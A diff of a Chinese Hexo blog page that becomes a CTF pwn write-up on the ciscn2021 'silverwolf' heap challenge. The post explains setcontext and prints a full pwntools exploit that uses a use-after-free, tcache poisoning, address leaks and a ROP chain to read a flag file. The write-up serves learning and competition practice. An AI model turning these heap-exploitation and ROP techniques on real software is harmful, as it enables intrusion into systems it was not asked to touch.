@@ -20,30 +20,39 @@
     var CONFIG = {"hostname":"a2ur2.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
   </script>
 
-  <meta name="description" content="在成为大赛pwn题签到员的路上">
-<meta property="og:type" content="website">
-<meta property="og:title" content="A2ur2的梦想小屋">
-<meta property="og:url" content="https://a2ur2.github.io/index.html">
+  <meta name="description" content="例题是来自ciscn2021初赛的silverwolf，原本只是用来练习利用setcontext去orw，没想到翻查各大师傅wp时发现这个题目有各种各样的pwn姿势，一个题目能搞出好几个exp，着实对本菜🐥幼小的心灵造成了不小冲击，于是我决定不白蓝要好好学习时，就把这些定成了小目标一一学习复现。弟弟我冲了，不然fallw1nd又要pua我了。 题目大概程序就是只能控制id为0的堆块，存在UAF">
+<meta property="og:type" content="article">
+<meta property="og:title" content="努力成长的pwn弟系列-【2】由silverwolf得到的各种新姿势">
+<meta property="og:url" content="https://a2ur2.github.io/2022/08/30/%E5%8A%AA%E5%8A%9B%E6%88%90%E9%95%BF%E7%9A%84pwn%E5%BC%9F%E7%B3%BB%E5%88%97-%E3%80%902%E3%80%91%E7%94%B1silverwolf%E5%BE%97%E5%88%B0%E7%9A%84%E5%90%84%E7%A7%8D%E6%96%B0%E5%A7%BF%E5%8A%BF/index.html">
 <meta property="og:site_name" content="A2ur2的梦想小屋">
-<meta property="og:description" content="在成为大赛pwn题签到员的路上">
+<meta property="og:description" content="例题是来自ciscn2021初赛的silverwolf，原本只是用来练习利用setcontext去orw，没想到翻查各大师傅wp时发现这个题目有各种各样的pwn姿势，一个题目能搞出好几个exp，着实对本菜🐥幼小的心灵造成了不小冲击，于是我决定不白蓝要好好学习时，就把这些定成了小目标一一学习复现。弟弟我冲了，不然fallw1nd又要pua我了。 题目大概程序就是只能控制id为0的堆块，存在UAF">
 <meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://s1.ax1x.com/2022/08/25/v2emHP.png">
+<meta property="og:image" content="https://s1.ax1x.com/2022/08/25/v2eaNT.jpg">
+<meta property="og:image" content="https://s1.ax1x.com/2022/08/30/vhXRts.png">
+<meta property="og:image" content="https://s1.ax1x.com/2022/08/30/vhX7BF.png">
+<meta property="og:image" content="https://s1.ax1x.com/2022/08/30/vhXLN9.png">
+<meta property="article:published_time" content="2022-08-29T16:00:00.000Z">
+<meta property="article:modified_time" content="2022-08-30T12:07:39.253Z">
 <meta property="article:author" content="A2ur2">
+<meta property="article:tag" content="pwn">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://s1.ax1x.com/2022/08/25/v2emHP.png">
 
-<link rel="canonical" href="https://a2ur2.github.io/">
+<link rel="canonical" href="https://a2ur2.github.io/2022/08/30/%E5%8A%AA%E5%8A%9B%E6%88%90%E9%95%BF%E7%9A%84pwn%E5%BC%9F%E7%B3%BB%E5%88%97-%E3%80%902%E3%80%91%E7%94%B1silverwolf%E5%BE%97%E5%88%B0%E7%9A%84%E5%90%84%E7%A7%8D%E6%96%B0%E5%A7%BF%E5%8A%BF/">
 
 
 <script id="page-configurations">
   // https://hexo.io/docs/variables.html
   CONFIG.page = {
     sidebar: "",
-    isHome : true,
-    isPost : false,
+    isHome : false,
+    isPost : true,
     lang   : 'zh-CN'
   };
 </script>
 
-  <title>A2ur2的梦想小屋</title>
+  <title>努力成长的pwn弟系列-【2】由silverwolf得到的各种新姿势 | A2ur2的梦想小屋</title>
   
 
 
@@ -157,9 +166,10 @@
         <div class="content-wrap">
           
 
-          <div class="content index posts-expand">
+          <div class="content post posts-expand">
             
-      
+
+    
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
@@ -175,10 +185,9 @@
       <meta itemprop="name" content="A2ur2的梦想小屋">
     </span>
       <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2022/08/30/%E5%8A%AA%E5%8A%9B%E6%88%90%E9%95%BF%E7%9A%84pwn%E5%BC%9F%E7%B3%BB%E5%88%97-%E3%80%902%E3%80%91%E7%94%B1silverwolf%E5%BE%97%E5%88%B0%E7%9A%84%E5%90%84%E7%A7%8D%E6%96%B0%E5%A7%BF%E5%8A%BF/" class="post-title-link" itemprop="url">努力成长的pwn弟系列-【2】由silverwolf得到的各种新姿势</a>
-        </h2>
+        <h1 class="post-title" itemprop="name headline">
+          努力成长的pwn弟系列-【2】由silverwolf得到的各种新姿势
+        </h1>
 
         <div class="post-meta">
             <span class="post-meta-item">
@@ -202,7 +211,7 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          <span id="more"></span>
+        <span id="more"></span>
 <p>例题是来自ciscn2021初赛的silverwolf，原本只是用来练习利用setcontext去orw，没想到翻查各大师傅wp时发现这个题目有各种各样的pwn姿势，一个题目能搞出好几个exp，着实对本菜🐥幼小的心灵造成了不小冲击，于是我决定不白蓝要好好学习时，就把这些定成了小目标一一学习复现。弟弟我冲了，不然fallw1nd又要pua我了。</p>
 <p>题目大概程序就是只能控制id为0的堆块，存在UAF漏洞，开了沙箱白名单，只允许open read 和write的系统调用，很ez是吧（</p>
 <h2 id="一、setcontext-orw（libc-lt-2-29）"><a href="#一、setcontext-orw（libc-lt-2-29）" class="headerlink" title="一、setcontext+orw（libc&lt;2.29）"></a>一、setcontext+orw（libc&lt;2.29）</h2><h3 id="1、setcontext"><a href="#1、setcontext" class="headerlink" title="1、setcontext"></a>1、setcontext</h3><p>setcontext是libc中一段根据rdi去索引相对应的值，然后将这些值mov进寄存器的一段汇编。在libc-2.29以下，它长介个样子</p>
@@ -247,512 +256,33 @@
 <h3 id="3、exp-1"><a href="#3、exp-1" class="headerlink" title="3、exp"></a>3、exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">p=process(<span class="string">&#x27;./silverwolf&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./silverwolf&#x27;</span>)</span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">menu</span>(<span class="params">choice</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice:&quot;</span>,<span class="built_in">str</span>(choice))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params"><span class="built_in">id</span>,size</span>):</span><br><span class="line">    menu(<span class="number">1</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index:&quot;</span>,<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;:&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params"><span class="built_in">id</span>,data</span>):</span><br><span class="line">    menu(<span class="number">2</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index:&quot;</span>,<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line">    </span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Content:&quot;</span>,<span class="built_in">str</span>(data))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params"><span class="built_in">id</span></span>):</span><br><span class="line">    menu(<span class="number">3</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index:&quot;</span>,<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params"><span class="built_in">id</span></span>):</span><br><span class="line">    menu(<span class="number">4</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index:&quot;</span>,<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check</span>():</span><br><span class="line">   gdb.attach(p)</span><br><span class="line">   raw_input()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check_edit</span>(<span class="params"><span class="built_in">id</span>,data</span>):</span><br><span class="line">    menu(<span class="number">2</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index:&quot;</span>,<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line">    check()</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Content:&quot;</span>,<span class="built_in">str</span>(data))</span><br><span class="line"></span><br><span class="line"><span class="comment">#edit(0,&#x27;flag.txt\n&#x27;)</span></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x8</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Content: &quot;</span>)</span><br><span class="line">heap_addr=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))-<span class="number">0x1790</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(heap_addr))</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x38</span>)</span><br><span class="line">edit(<span class="number">0</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x511</span>)+p64(heap_addr+<span class="number">0x10d0</span>))</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x68</span>)</span><br><span class="line"><span class="comment">#edit(0,heap_addr)</span></span><br><span class="line"><span class="comment">#add(0,0x38)</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,p64(heap_addr+<span class="number">0x1930</span>))</span><br><span class="line">chunk_head=p64(<span class="number">0</span>)+p64(<span class="number">0x31</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">15</span>):</span><br><span class="line">  add(<span class="number">0</span>,<span class="number">0x58</span>)</span><br><span class="line">  edit(<span class="number">0</span>,p64(<span class="number">0</span>)*<span class="number">6</span>+chunk_head)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x68</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x68</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">libc=u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>))-<span class="number">0x3ebca0</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc))</span><br><span class="line">setcontext=libc+<span class="number">0x52050</span>+<span class="number">53</span></span><br><span class="line">free_hook=libc+<span class="number">0x3ed8e8</span></span><br><span class="line">write=libc+<span class="number">0x1100f0</span></span><br><span class="line">read=libc+<span class="number">0x110020</span></span><br><span class="line">openadd=libc+<span class="number">0x10fbf0</span></span><br><span class="line">pop_rdi_rbp=libc+<span class="number">0x0000000000022394</span></span><br><span class="line">pop_rdi=libc+<span class="number">0x000000000002164f</span></span><br><span class="line">pop_rsi=libc+<span class="number">0x0000000000023a6a</span></span><br><span class="line">pop_rdx=libc+<span class="number">0x0000000000001b96</span></span><br><span class="line">pop_rax=libc+<span class="number">0x000000000001b500</span></span><br><span class="line">syscall=libc+<span class="number">0x00000000000d2625</span></span><br><span class="line">environ=libc+<span class="number">0x3ee098</span></span><br><span class="line">pop_rdx_rbx=libc+<span class="number">0x000000000011c35c</span></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x38</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">0</span>,p64(environ)*<span class="number">2</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x18</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,<span class="string">&#x27;./flag\x00&#x27;</span>)</span><br><span class="line">flag_addr=heap_addr+<span class="number">0x1610</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x38</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x38</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">stack=u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))-<span class="number">0x120</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;[+]stack=&#x27;</span>+<span class="built_in">hex</span>(stack))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">orw1</span>():</span><br><span class="line">  add(<span class="number">0</span>,<span class="number">0x68</span>)</span><br><span class="line">  delete(<span class="number">0</span>)</span><br><span class="line">  edit(<span class="number">0</span>,p64(stack))</span><br><span class="line">  add(<span class="number">0</span>,<span class="number">0x68</span>)</span><br><span class="line">  </span><br><span class="line">  add(<span class="number">0</span>,<span class="number">0x68</span>)</span><br><span class="line">  pd=p64(pop_rdi)+p64(flag_addr)+p64(pop_rsi)+p64(<span class="number">0</span>)+p64(pop_rax)</span><br><span class="line">  pd+=p64(<span class="number">2</span>)+p64(syscall)+p64(pop_rdi)+p64(<span class="number">3</span>)+p64(pop_rsi)</span><br><span class="line">  pd+=p64(heap_addr)+p64(pop_rdx_rbx)+p64(<span class="number">0x100</span>)<span class="comment">#stack rop</span></span><br><span class="line">  <span class="built_in">print</span>(<span class="string">&#x27;[+]stack=&#x27;</span>+<span class="built_in">hex</span>(stack))</span><br><span class="line">  </span><br><span class="line">  check_edit(<span class="number">0</span>,pd)</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x28</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">0</span>,p64(stack+<span class="number">0x70</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;write=&#x27;</span>+<span class="built_in">hex</span>(stack+<span class="number">0x70</span>))</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x28</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x28</span>)</span><br><span class="line">pd=p64(read)+p64(pop_rdi)+p64(<span class="number">1</span>)+p64(write)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,pd)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">orw1()</span><br><span class="line"></span><br><span class="line"><span class="comment">#menu(5)</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 
 
-      
     </div>
 
     
     
     
+
       <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
+          <div class="post-tags">
+              <a href="/tags/pwn/" rel="tag"># pwn</a>
+          </div>
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://a2ur2.github.io/2022/08/02/%E5%8A%AA%E5%8A%9B%E6%88%90%E4%B8%BApwn%E7%88%B7%E7%B3%BB%E5%88%97-%E3%80%901%E3%80%91fsop/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="A2ur2">
-      <meta itemprop="description" content="在成为大赛pwn题签到员的路上">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="A2ur2的梦想小屋">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2022/08/02/%E5%8A%AA%E5%8A%9B%E6%88%90%E4%B8%BApwn%E7%88%B7%E7%B3%BB%E5%88%97-%E3%80%901%E3%80%91fsop/" class="post-title-link" itemprop="url">努力成长的pwn弟系列-【1】fsop</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-              
-
-              <time title="创建时间：2022-08-02 00:00:00 / 修改时间：16:10:53" itemprop="dateCreated datePublished" datetime="2022-08-02T00:00:00+08:00">2022-08-02</time>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h2 id="一、基础知识"><a href="#一、基础知识" class="headerlink" title="一、基础知识"></a>一、基础知识</h2><h3 id="1、IO-FILE的主要结构"><a href="#1、IO-FILE的主要结构" class="headerlink" title="1、IO FILE的主要结构"></a>1、IO FILE的主要结构</h3><p>在进入正题之前，我们需要对IO FILE有一定基本了解，之前我们知道的利用unsorted bin残留指针去爆破stdout就是修改了IO FILE里面的机构，让其能输出。一般的程序都会有stdout、stdrr、stdin这三个管理数据流的IO FILE</p>
-          <!--noindex-->
-            <div class="post-button">
-              <a class="btn" href="/2022/08/02/%E5%8A%AA%E5%8A%9B%E6%88%90%E4%B8%BApwn%E7%88%B7%E7%B3%BB%E5%88%97-%E3%80%901%E3%80%91fsop/#more" rel="contents">
-                阅读全文 &raquo;
-              </a>
-            </div>
-          <!--/noindex-->
         
-      
-    </div>
 
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://a2ur2.github.io/2022/07/20/Game[1]%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9Bwp-pwn/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="A2ur2">
-      <meta itemprop="description" content="在成为大赛pwn题签到员的路上">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="A2ur2的梦想小屋">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2022/07/20/Game%5B1%5D%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9Bwp-pwn/" class="post-title-link" itemprop="url">Game[1]蓝帽杯初赛wp-pwn</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-              
-
-              <time title="创建时间：2022-07-20 00:00:00 / 修改时间：15:58:05" itemprop="dateCreated datePublished" datetime="2022-07-20T00:00:00+08:00">2022-07-20</time>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p>这次蓝帽跟着fallw1nd师傅一起，摸进了半决，希望能顺利去一次线下捏qwq</p>
-          <!--noindex-->
-            <div class="post-button">
-              <a class="btn" href="/2022/07/20/Game%5B1%5D%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9Bwp-pwn/#more" rel="contents">
-                阅读全文 &raquo;
-              </a>
-            </div>
-          <!--/noindex-->
         
-      
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2022/08/02/%E5%8A%AA%E5%8A%9B%E6%88%90%E4%B8%BApwn%E7%88%B7%E7%B3%BB%E5%88%97-%E3%80%901%E3%80%91fsop/" rel="prev" title="努力成长的pwn弟系列-【1】fsop">
+      <i class="fa fa-chevron-left"></i> 努力成长的pwn弟系列-【1】fsop
+    </a></div>
+      <div class="post-nav-item"></div>
     </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
       </footer>
+    
   </article>
   
   
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://a2ur2.github.io/2022/05/25/%E5%88%9D%E6%8E%A2IO%20FILE%E4%BB%A5%E5%8F%8A%E5%85%B3%E4%BA%8Eexit%20hook%E7%9A%84%E5%88%A9%E7%94%A8/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="A2ur2">
-      <meta itemprop="description" content="在成为大赛pwn题签到员的路上">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="A2ur2的梦想小屋">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2022/05/25/%E5%88%9D%E6%8E%A2IO%20FILE%E4%BB%A5%E5%8F%8A%E5%85%B3%E4%BA%8Eexit%20hook%E7%9A%84%E5%88%A9%E7%94%A8/" class="post-title-link" itemprop="url">stdout，tcache和exit hook一锅端</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2022-05-25 19:29:14" itemprop="dateCreated datePublished" datetime="2022-05-25T19:29:14+08:00">2022-05-25</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2022-05-26 19:45:33" itemprop="dateModified" datetime="2022-05-26T19:45:33+08:00">2022-05-26</time>
-              </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h2 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h2><p>时隔一个月某有更新博客了，上一次搞那个patchelf调了快半个星期没弄好之后心态大崩，一下子动力失去，直接摆烂了一整个五一。五一过后没多久，被uuu师傅狠狠的打击到了orz，又捡起来了继续pwn。然后紧接着就是省赛，看了下去年的省赛两题都是2.31的堆，都是没有输出函数要打stdout去输出，最后劫持tcache去getshell，当时一看差点直接晕厥，后面一个多星期速成完了tcache和stdout输出，对这两个技巧有了大致了解后就是五月的das了，又是stdout输出（</p>
-<p>直接赶趟了，一篇博客一道题搞完劫持stdout还有最后利用tcache劫持到exit hook完成getshell</p>
-          <!--noindex-->
-            <div class="post-button">
-              <a class="btn" href="/2022/05/25/%E5%88%9D%E6%8E%A2IO%20FILE%E4%BB%A5%E5%8F%8A%E5%85%B3%E4%BA%8Eexit%20hook%E7%9A%84%E5%88%A9%E7%94%A8/#more" rel="contents">
-                阅读全文 &raquo;
-              </a>
-            </div>
-          <!--/noindex-->
-        
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://a2ur2.github.io/2022/04/20/%E8%BF%91%E6%97%A5%E5%AD%A6%E4%B9%A0%E7%A2%8E%E7%89%87/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="A2ur2">
-      <meta itemprop="description" content="在成为大赛pwn题签到员的路上">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="A2ur2的梦想小屋">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2022/04/20/%E8%BF%91%E6%97%A5%E5%AD%A6%E4%B9%A0%E7%A2%8E%E7%89%87/" class="post-title-link" itemprop="url">今日学习碎片</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2022-04-20 00:00:00" itemprop="dateCreated datePublished" datetime="2022-04-20T00:00:00+08:00">2022-04-20</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2022-04-22 22:00:15" itemprop="dateModified" datetime="2022-04-22T22:00:15+08:00">2022-04-22</time>
-              </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h2 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h2><p>最近这段时间，感觉没有说系统的学习一个bin的attack，而是卡在了一题heap的题目，反复调试下也是掌握了一些零碎的但未曾接触过的知识。最近的学习状态有点迷，感觉自己的兴趣和热情被消耗的过多，容易去担忧自己未来能不能找到一个让自己满意的工作，怕自己能力和天赋不足，怕付出和收获不成正比。emo下，进入正题，分享一道简单堆题</p>
-          <!--noindex-->
-            <div class="post-button">
-              <a class="btn" href="/2022/04/20/%E8%BF%91%E6%97%A5%E5%AD%A6%E4%B9%A0%E7%A2%8E%E7%89%87/#more" rel="contents">
-                阅读全文 &raquo;
-              </a>
-            </div>
-          <!--/noindex-->
-        
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://a2ur2.github.io/2022/04/11/fastbin%20attacked/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="A2ur2">
-      <meta itemprop="description" content="在成为大赛pwn题签到员的路上">
